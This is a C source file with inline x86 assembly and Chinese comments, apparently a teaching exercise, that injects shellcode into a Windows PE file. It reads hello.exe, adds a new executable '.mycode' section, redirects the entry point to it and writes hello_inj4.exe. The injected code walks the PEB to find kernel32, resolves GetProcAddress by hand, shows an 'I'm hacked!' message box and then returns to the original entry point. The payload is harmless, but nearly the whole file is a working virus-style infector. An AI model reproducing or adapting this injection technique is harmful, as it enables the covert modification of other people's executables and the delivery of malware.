#include <windows.h>
#include <stdio.h>
#define MAX_SECTION_NUM   16
#define MAX_IMPDESC_NUM   64
#pragma comment(lib,"user32.lib")
HANDLE  hHeap;
PIMAGE_DOS_HEADER pDosHeader;
PCHAR   pDosStub;
DWORD   dwDosStubSize;
DWORD   dwDosStubOffset;
PIMAGE_NT_HEADERS           pNtHeaders;
PIMAGE_FILE_HEADER          pFileHeader;
PIMAGE_OPTIONAL_HEADER32    pOptHeader;
PIMAGE_SECTION_HEADER   pSecHeaders;
PIMAGE_SECTION_HEADER   pSecHeader[MAX_SECTION_NUM];
WORD  wSecNum;
PBYTE pSecData[MAX_SECTION_NUM];
DWORD dwSecSize[MAX_SECTION_NUM];
DWORD dwFileSize;
DWORD dwSizeOfCode ;
PBYTE pRemoteCode, pCode, pOrignCode;
void code();
void _addr_orign_aoep();
void _addr_getprocAddress();
void _addr_kernel32();
void _addr_imagebase();
void code_end();
/*
    0:先保存入口地址
    1:先把入口地址指向病毒所在的段,在add section时做这个步骤
    2:执行玩后跳到原本的入口地址
*/
__declspec(naked) void code()
{
    __asm {
        pushad
        call    _delta
_delta:
        pop     ebx                         // save registers context from stack
        sub     ebx, offset _delta
/************************************************************/
//要保持栈平衡
        call offset _GetBaseKernel32
        mov [ebx+_addr_kernel32],eax            //返回值eax中保存了kernel32的基地址
        push eax
        call offset _GetGetProcAddrBase
        mov [ebx+_addr_getprocAddress],eax      //返回值eax中保存了getprocAddress的地址
        pop ecx                                 //ecx中保存了kernel32的句柄
        lea edx,[ebx + _str_getModuleHandleA]   //edx中保存了字符串的地址
        push edx
        push ecx
        call eax  //调用getprocAddress
        //返回值中包含了 getModuleHandleA的地址
        push 0
        call eax
       //返回值中包含了pe文件基地址
        mov [ebx + _addr_imagebase],eax//保存基地址,我们新建的这个段是不可写的
       
       
        lea edx,[ebx +_str_LoadLibrary]
        push edx
        mov eax,[ebx+_addr_kernel32]
        push eax
        mov eax,[ebx+_addr_getprocAddress]
        call eax
        //返回值中包含了loadlibrary的地址
        lea edx,[ebx+_str_user32]
        push edx
        call eax
        //返回值中包含了user32.dll的基地址
        lea edx,[ebx+_str_MessageBox]
        push edx
        push eax
        mov eax,[ebx+_addr_getprocAddress]
        call eax
        //返回值中是，messagebox的地址
        push 0
        lea edx,[ebx+_str_hacked]
        push edx
        push edx
        push 0
        call eax



/************************************************************/
        mov     eax, dword ptr[ebx + _addr_imagebase] //定位基地址
        add     eax,dword ptr [ebx + _addr_orign_aoep]//定位入口偏移
        mov     dword ptr [esp + 0x1C], eax     // save (dwBaseAddress + orign) to eax-location-of-context
        popad                                   // load registers context from stack
        push    eax
        xor     eax, eax
        retn                                    // >> jump to the Original AOEP
/**************************返回原程序**********************************/
_str_hacked:
        _emit 'I'
        _emit '\''
        _emit 'm'
        _emit ' '
        _emit 'h'
        _emit 'a'
        _emit 'c'
        _emit 'k'
        _emit 'e'
        _emit 'd'
        _emit '!'
        _emit 0x0
_str_MessageBox:
            _emit 'M'
            _emit 'e'
            _emit 's'
            _emit 's'
            _emit 'a'
            _emit 'g'
            _emit 'e'
            _emit 'B'
            _emit 'o'
            _emit 'x'
            _emit 'A'
            _emit 0x0
_str_user32:
            _emit 'u'
            _emit 's'
            _emit 'e'
            _emit 'r'
            _emit '3'
            _emit '2'
            _emit '.'
            _emit 'd'
            _emit 'l'
            _emit 'l'
            _emit 0x0
_str_LoadLibrary:
            _emit 'L'
            _emit 'o'
            _emit 'a'
            _emit 'd'
            _emit 'L'
            _emit 'i'
            _emit 'b'
            _emit 'r'
            _emit 'a'
            _emit 'r'
            _emit 'y'
            _emit 'A'
            _emit 0x0
_str_getModuleHandleA:
            _emit 'G'
            _emit 'e'
            _emit 't'
            _emit 'M'
            _emit 'o'
            _emit 'd'
            _emit 'u'
            _emit 'l'
            _emit 'e'
            _emit 'H'
            _emit 'a'
            _emit 'n'
            _emit 'd'
            _emit 'l'
            _emit 'e'
            _emit 'A'
            _emit 0x0
      // type : DWORD GetBaseKernel32()
_GetBaseKernel32:
        push    ebp
        mov     ebp, esp
        push    esi
        push    edi
        xor     ecx, ecx                    // ECX = 0
        mov     esi, fs:[0x30]              // ESI = &(PEB) ([FS:0x30])
        mov     esi, [esi + 0x0c]           // ESI = PEB->Ldr
        mov     esi, [esi + 0x1c]           // ESI = PEB->Ldr.InInitOrder
_next_module:
        mov     eax, [esi + 0x08]           // EBP = InInitOrder[X].base_address
        mov     edi, [esi + 0x20]           // EBP = InInitOrder[X].module_name (unicode)
        mov     esi, [esi]                  // ESI = InInitOrder[X].flink (next module)
        cmp     [edi + 12*2], cx            // modulename[12] == 0 ?
        jne     _next_module                 // No: try next module.
        pop     edi
        pop     esi
        mov     esp, ebp
        pop     ebp
        ret
// ---------------------------------------------------------
// type : DWORD GetGetProcAddrBase(DWORD base)
_GetGetProcAddrBase:
        push    ebp
        mov     ebp, esp
        push    edx
        push    ebx
        push    edi
        push    esi

        mov     ebx, [ebp+8]
        mov     eax, [ebx + 0x3c] // edi = BaseAddr, eax = pNtHeader
        mov     edx, [ebx + eax + 0x78]
        add     edx, ebx          // edx = Export Table (RVA)
        mov     ecx, [edx + 0x18] // ecx = NumberOfNames
        mov     edi, [edx + 0x20] //
        add     edi, ebx          // ebx = AddressOfNames

_search:
        dec     ecx
        mov     esi, [edi + ecx*4]
        add     esi, ebx
        mov     eax, 0x50746547 // "PteG"
        cmp     [esi], eax
        jne     _search
        mov     eax, 0x41636f72 //"Acor"
        cmp     [esi+4], eax
        jne     _search

        mov     edi, [edx + 0x24] //
        add     edi, ebx      // edi = AddressOfNameOrdinals
        mov     cx, word ptr [edi + ecx*2]  // ecx = GetProcAddress-orinal
        mov     edi, [edx + 0x1c] //
        add     edi, ebx      // edi = AddressOfFunction
        mov     eax, [edi + ecx*4]
        add     eax, ebx      // eax = GetProcAddress
        
        pop     esi
        pop     edi
        pop     ebx
        pop     edx
        
        mov     esp, ebp
        pop     ebp
        ret  
    }
}
__declspec(naked) void _addr_orign_aoep()
{
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
}
__declspec(naked) void _addr_getprocAddress()
{
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
}
__declspec(naked) void _addr_kernel32()
{
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
}
__declspec(naked) void _addr_imagebase()
{
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
    __asm _emit 0xcc
}
__declspec(naked) void code_end()
{
    __asm _emit 0xcc
}
// make_code()函数是将开始标记code_start和结束标记code_end之间的所有二进制数据拷贝到一个缓冲区中
DWORD make_code()
{
    int off; 
    __asm {
        mov edx, offset code
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
    *(PDWORD)((PBYTE)_addr_orign_aoep-(DWORD)pOrignCode+(DWORD)pCode) = pOptHeader->AddressOfEntryPoint;
    //把原来的入口地址保存在变量_addr_origna_aoep中
    return dwSizeOfCode;
}
/******************************************************************/
static DWORD PEAlign(DWORD dwTarNum,DWORD dwAlignTo)
{	
    //对齐处理
    return (((dwTarNum+dwAlignTo - 1) / dwAlignTo) * dwAlignTo);
}
WORD  wInjSecNo;
BOOL AddNewSection()
{
   // printf("sizeof code%d\n",sizeof(pCode));
    DWORD roffset,rsize,voffset,vsize;
    DWORD dwOffsetOfcode;
    PIMAGE_SECTION_HEADER pInjSecHeader;
    int   i;

    wInjSecNo = wSecNum;

    if (wInjSecNo >= 64) {
        printf("[E]: Too many sections, wInjSecNo(%d) >= 63\n", wInjSecNo);
        return FALSE;
    }

    pInjSecHeader = (PIMAGE_SECTION_HEADER)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(IMAGE_SECTION_HEADER));
    if(pInjSecHeader == NULL) {
        printf("[E]: HeapAlloc failed for NEW_SEC_HEADER\n");
        return FALSE;
    }
    pSecHeader[wInjSecNo] = pInjSecHeader;
    //先添加section头

    // 请填入代码
     rsize =PEAlign(dwSizeOfCode,pOptHeader->FileAlignment) ;

    // 请填入代码
     vsize = dwSizeOfCode;
     //vsize应该是section未对齐前的实际尺寸,且只有在为数据段时比对齐后的磁盘大小大，因为为初始化的数据只有在内存中才会分配空间

    roffset = PEAlign(pSecHeader[wInjSecNo-1]->PointerToRawData + pSecHeader[wInjSecNo-1]->SizeOfRawData,
            pOptHeader->FileAlignment);
    //感觉这一步并没有必要PEAlign,PointerToRawData是对齐后的偏移,SizeOfRawData是对齐后的大小，两个相加肯定也是对齐的
    voffset = PEAlign(pSecHeader[wInjSecNo-1]->VirtualAddress + pSecHeader[wInjSecNo-1]->Misc.VirtualSize,
           pOptHeader->SectionAlignment);

    pSecHeader[wInjSecNo]->PointerToRawData     = roffset;
    pSecHeader[wInjSecNo]->VirtualAddress       = voffset;
    pSecHeader[wInjSecNo]->SizeOfRawData        = rsize;
    pSecHeader[wInjSecNo]->Misc.VirtualSize     = vsize;
    pSecHeader[wInjSecNo]->Characteristics      = 0xe0000020;
    //设置新的section可执行,权限和.text一样,e表示可读可写可执行
    pSecHeader[wInjSecNo]->Name[0] = '.';
    pSecHeader[wInjSecNo]->Name[1] = 'm';
    pSecHeader[wInjSecNo]->Name[2] = 'y';
    pSecHeader[wInjSecNo]->Name[3] = 'c';
    pSecHeader[wInjSecNo]->Name[4] = 'o';
    pSecHeader[wInjSecNo]->Name[5] = 'd';
    pSecHeader[wInjSecNo]->Name[6] = 'e';
    pSecHeader[wInjSecNo]->Name[7] = '\0';
    
    pSecData[wInjSecNo] = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, rsize);
    dwSecSize[wInjSecNo] = pSecHeader[wInjSecNo]->SizeOfRawData;
    CopyMemory(pSecData[wInjSecNo], pCode, dwSizeOfCode);
    wSecNum++;
    pFileHeader->NumberOfSections = wSecNum;
    pOptHeader->SizeOfImage = pSecHeader[wSecNum-1]->VirtualAddress + PEAlign(pSecHeader[wSecNum-1]->Misc.VirtualSize,pOptHeader->SectionAlignment);
    dwFileSize = pSecHeader[wSecNum-1]->PointerToRawData + pSecHeader[wSecNum - 1]->SizeOfRawData;
    pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
    pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
    return TRUE;
    //大部分PE文件都不使用文件头中的CheckSum域的校验和值
    //不过有些PE文件，如关键的系统服务程序文件以及驱动程序文件则该值必须正确，否则系统加载器将拒绝加载
}
/******************************************************************/
BOOL CopyPEFileToMem(LPCSTR lpszFilename)
{
    //先为整个文件分配堆空间，把pe拷贝进入，然后为每个模块分配空间，从pe空间拷贝过去，最后释放pe空间
    HANDLE  hFile;
    PBYTE   pMem;
    DWORD   dwBytesRead;
    int     i;
    DWORD   dwSecOff;

    PIMAGE_NT_HEADERS       pMemNtHeaders;   
    PIMAGE_SECTION_HEADER   pMemSecHeaders;

    hFile = CreateFile(lpszFilename, GENERIC_READ,
                FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[E]: Open file (%s) failed.\n", lpszFilename);
        return FALSE;
    }
    dwFileSize = GetFileSize(hFile, 0);
    printf("[I]: Open file (%s) ok, with size of 0x%08x.\n", lpszFilename, dwFileSize);
    
    pMem = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize);

    if(pMem == NULL) {
        printf("[E]: HeapAlloc failed (with the size of 0x%08x).\n", dwFileSize);
        CloseHandle(hFile);
        return FALSE;
    }
  
    ReadFile(hFile, pMem, dwFileSize, &dwBytesRead, NULL);
    //把pe文件读取到分配好的堆空间内
    CloseHandle(hFile);

    // Copy DOS Header 
    pDosHeader = (PIMAGE_DOS_HEADER)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(IMAGE_DOS_HEADER));

    if(pDosHeader == NULL) {
        printf("[E]: HeapAlloc failed for DOS_HEADER\n");
        CloseHandle(hFile);
        return FALSE;
    }
    CopyMemory(pDosHeader, pMem, sizeof(IMAGE_DOS_HEADER));

    // Copy DOS Stub Code 
    dwDosStubSize = pDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER);
    dwDosStubOffset = sizeof(IMAGE_DOS_HEADER);
    pDosStub = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwDosStubSize);
    if ((dwDosStubSize & 0x80000000) == 0x00000000)
    {
        CopyMemory(pDosStub, (const void *)(pMem + dwDosStubOffset), dwDosStubSize);
    }

    // Copy NT HEADERS 
    pMemNtHeaders = (PIMAGE_NT_HEADERS)(pMem + pDosHeader->e_lfanew);
    
    pNtHeaders = (PIMAGE_NT_HEADERS)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(IMAGE_NT_HEADERS));

    if(pNtHeaders == NULL) {
        printf("[E]: HeapAlloc failed for NT_HEADERS\n");
        CloseHandle(hFile);
        return FALSE;
    }

    CopyMemory(pNtHeaders, pMemNtHeaders, sizeof(IMAGE_NT_HEADERS));

    pOptHeader = &(pNtHeaders->OptionalHeader);
    pFileHeader = &(pNtHeaders->FileHeader);

    // Copy SectionTable
    pMemSecHeaders = (PIMAGE_SECTION_HEADER) ((DWORD)pMemNtHeaders + sizeof(IMAGE_NT_HEADERS));
    wSecNum = pFileHeader->NumberOfSections;

    pSecHeaders = (PIMAGE_SECTION_HEADER)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, wSecNum * sizeof(IMAGE_SECTION_HEADER));

    if(pSecHeaders == NULL) {
        printf("[E]: HeapAlloc failed for SEC_HEADERS\n");
        CloseHandle(hFile);
        return FALSE;
    }

    CopyMemory(pSecHeaders, pMemSecHeaders, wSecNum * sizeof(IMAGE_SECTION_HEADER));

    for(i = 0; i < wSecNum; i++) {
        pSecHeader[i] = (PIMAGE_SECTION_HEADER) 
          ((DWORD)pSecHeaders + i * sizeof(IMAGE_SECTION_HEADER));
    }

    // Copy Section
    for(i = 0; i < wSecNum; i++) {
        dwSecOff = (DWORD)(pMem + pSecHeader[i]->PointerToRawData);
        //磁盘偏移
        dwSecSize[i] = PEAlign(pSecHeader[i]->SizeOfRawData, pOptHeader->FileAlignment);
        //提取section的大小=磁盘对齐后的大小 
        pSecData[i] = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSecSize[i]);
        printf("[E]: HeapAlloc failed for the section of %s,it's size is 0x%08x\n", pSecHeader[i]->Name,dwSecSize[i]);
        if (pSecData[i] == NULL) {
           // printf("[E]: HeapAlloc failed for the section of %x,it's size is 0x%08x\n", pSecHeader[i]->Name,dwSecSize[i]);
            CloseHandle(hFile);
            return FALSE;
        }

        CopyMemory(pSecData[i], (PVOID)dwSecOff, dwSecSize[i]);
    }

    HeapFree(hHeap, 0, pMem);
    printf("[I]: Load PE from file (%s) ok\n", lpszFilename);

    return TRUE;
}

void OutputPEInMem()
{
    // 请在这里填入你的代码
    int i;
    printf("[Output]: ImageBase           = 0x%08x\n",pOptHeader->ImageBase);
    printf("[Output]: AddressOfEntryPoint = 0x%08x\n",pOptHeader->AddressOfEntryPoint);
    printf("[Output]: SizeOfImage         = 0x%08x\n",pOptHeader->SizeOfImage);
    printf("[Output]: NumberOfSections    = 0x%08x\n",pFileHeader->NumberOfSections);
    for(i=0;i<pFileHeader->NumberOfSections;i++)
     { 
    printf("#----------------------------------------------#\n");
    printf("[Output]:Section Name         = %s\n",pSecHeader[i]->Name);
    printf("[Output]:Voffset              = 0x%08x\n",pSecHeader[i]->VirtualAddress);
    printf("[Output]:Vsize                = 0x%08x\n",pSecHeader[i]->Misc.VirtualSize);
    printf("[Output]:Roffset              = 0x%08x\n",pSecHeader[i]->PointerToRawData);
    printf("[Output]:Rsize                = 0x%08x\n",pSecHeader[i]->SizeOfRawData);
    printf("[Output]:Characteristics      = 0x%08x\n",pSecHeader[i]->Characteristics);
     }
}
BOOL CopyMen2File(LPCSTR pName)
{
   HANDLE  hFile;
   PBYTE   pMem;
   DWORD   dwBytesWritten; 
   int     i;
   DWORD   dwSecOff;
   PIMAGE_NT_HEADERS       pMemNtHeaders;   
   PIMAGE_SECTION_HEADER   pMemSecHeaders;
   PIMAGE_SECTION_HEADER   pMenAddSec;
/*********/
  pOptHeader->AddressOfEntryPoint=pSecHeader[wSecNum-1]->VirtualAddress;
  //修改入口地址为新添加的section的偏移
/*********/


   hFile = CreateFile(pName,
            GENERIC_WRITE,
            FILE_SHARE_WRITE | FILE_SHARE_READ,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[E]: Create file (%s) failed.\n", pName);
        return FALSE;
    }
    pMem = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize);
    if(pMem == NULL) {
        printf("[E]: HeapAlloc failed (with the size of 0x%08x).\n", dwFileSize);
        CloseHandle(hFile);
        return FALSE;
    }
    CopyMemory(pMem, pDosHeader,sizeof(IMAGE_DOS_HEADER));
    if ((dwDosStubSize & 0x80000000) == 0x00000000)
    {
        CopyMemory((void *)(pMem + dwDosStubOffset), pDosStub, dwDosStubSize);
    }
    pMemNtHeaders = (PIMAGE_NT_HEADERS)(pMem + pDosHeader->e_lfanew);
    CopyMemory(pMemNtHeaders, pNtHeaders, sizeof(IMAGE_NT_HEADERS));
    
    // Copy privious Section Header
    pMemSecHeaders = (PIMAGE_SECTION_HEADER) ((DWORD)pMemNtHeaders + sizeof(IMAGE_NT_HEADERS));
    CopyMemory(pMemSecHeaders, pSecHeaders, (wSecNum-1)* sizeof(IMAGE_SECTION_HEADER));
    // copy added section
     pMenAddSec= (PIMAGE_SECTION_HEADER)((DWORD)pMemSecHeaders + (wSecNum-1)*sizeof(IMAGE_SECTION_HEADER));
     CopyMemory(pMenAddSec,pSecHeader[wSecNum-1],sizeof(IMAGE_SECTION_HEADER));
    // Copy Section data
    for(i = 0; i < wSecNum; i++) 
    {
        dwSecOff = (DWORD)(pMem + pSecHeader[i]->PointerToRawData);
        CopyMemory((PVOID)dwSecOff, pSecData[i], pSecHeader[i]->SizeOfRawData);
    }
    
    WriteFile(hFile, pMem, dwFileSize, &dwBytesWritten, NULL); 
    CloseHandle(hFile);  
    HeapFree(hHeap, 0, pMem); 
    return TRUE;
}
int main()
{
    LPCSTR lpszFileName = "hello.exe";
    LPCSTR lpszInjFileName = "hello_inj4.exe";
    
    hHeap = GetProcessHeap();
    if (! CopyPEFileToMem(lpszFileName)) {
        return 1;
    }
    make_code();
    AddNewSection();
    OutputPEInMem();
     if (! CopyMen2File(lpszInjFileName)) {
        return 1;
    }
    return 0;
}